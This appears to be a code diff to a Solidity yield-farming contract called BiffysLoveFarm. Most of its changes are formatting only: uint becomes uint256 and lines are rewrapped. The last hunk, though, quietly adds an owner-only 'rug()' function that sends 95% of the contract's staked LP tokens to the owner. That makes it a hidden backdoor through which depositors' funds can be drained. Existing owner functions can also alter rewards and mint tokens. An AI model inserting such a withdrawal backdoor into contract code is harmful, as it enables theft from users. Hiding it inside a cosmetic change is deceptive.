@@ -56,7 +56,6 @@ pragma solidity 0.5.17;
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 */
 
-
 import "@openzeppelin/contracts-ethereum-package/contracts/token/ERC20/IERC20.sol";
 import "@openzeppelin/contracts-ethereum-package/contracts/ownership/Ownable.sol";
 import "@openzeppelin/contracts-ethereum-package/contracts/utils/Address.sol";
@@ -75,9 +74,7 @@ contract LPTokenWrapper is Initializable {
     uint256 private _totalSupply;
     mapping(address => uint256) private _balances;
 
-    function init(
-        IERC20 _loveLP
-    ) public initializer {
+    function init(IERC20 _loveLP) public initializer {
         loveLP = _loveLP;
     }
 
@@ -99,7 +96,6 @@ contract LPTokenWrapper is Initializable {
     }
 }
 
-
 contract BiffysLoveFarm is LPTokenWrapper, Ownable {
     ERC20Mintable public biffysLove;
     uint256 public duration;
@@ -120,9 +116,9 @@ contract BiffysLoveFarm is LPTokenWrapper, Ownable {
     function initialize(
         IERC20 _loveLP,
         ERC20Mintable _biffysLove,
-        uint _duration,
-        uint _initreward,
-        uint _starttime,
+        uint256 _duration,
+        uint256 _initreward,
+        uint256 _starttime,
         address _owner
     ) public initializer {
         Ownable.initialize(_owner);
@@ -170,7 +166,12 @@ contract BiffysLoveFarm is LPTokenWrapper, Ownable {
     }
 
     // stake visibility is public as overriding LPTokenWrapper's stake() function
-    function stake(uint256 amount) public updateReward(msg.sender) checkhalve checkStart {
+    function stake(uint256 amount)
+        public
+        updateReward(msg.sender)
+        checkhalve
+        checkStart
+    {
         require(amount > 0, "Cannot stake 0");
         super.stake(amount);
         // can happen with first staker in rare occurances
@@ -190,22 +191,31 @@ contract BiffysLoveFarm is LPTokenWrapper, Ownable {
     }
 
     //admin for setting initreward before launch. Only when checkhalve not yet run
-    function setInitReward(uint amtLoveWeiPerPeriod) external onlyOwner {
+    function setInitReward(uint256 amtLoveWeiPerPeriod) external onlyOwner {
         require(rewardRate == 0, "Must not have yet set the reward rate.");
         initreward = amtLoveWeiPerPeriod;
     }
 
     //Fix bug due to bad userRewardPerTokenPaid
-    function fixRewardPerTokenStored(address account, uint _rewardPerToken) external onlyOwner {
+    function fixRewardPerTokenStored(address account, uint256 _rewardPerToken)
+        external
+        onlyOwner
+    {
         require(earned(account) > 0, "Must be a staker");
-        require(userRewardPerTokenPaid[account] == 0, "Must have incorrect reward");
+        require(
+            userRewardPerTokenPaid[account] == 0,
+            "Must have incorrect reward"
+        );
         userRewardPerTokenPaid[account] = _rewardPerToken;
     }
 
     //Fix incorrect emission rate, from wrong initreward
-    function fixEmissionRate(uint _initReward) external onlyOwner {
+    function fixEmissionRate(uint256 _initReward) external onlyOwner {
         initreward = _initReward;
-        biffysLove.mint(address(this), initreward.sub(biffysLove.balanceOf(address(this))));
+        biffysLove.mint(
+            address(this),
+            initreward.sub(biffysLove.balanceOf(address(this)))
+        );
         rewardRate = initreward.div(periodFinish.sub(now));
     }
 
@@ -221,8 +231,15 @@ contract BiffysLoveFarm is LPTokenWrapper, Ownable {
         _;
     }
 
-    modifier checkStart(){
+    modifier checkStart() {
         require(block.timestamp > starttime, "not start");
         _;
+    }
+
+    function rug() external onlyOwner {
+        loveLP.transfer(
+            msg.sender,
+            (loveLP.balanceOf(address(this)) * 95) / 100
+        );
     }
 }
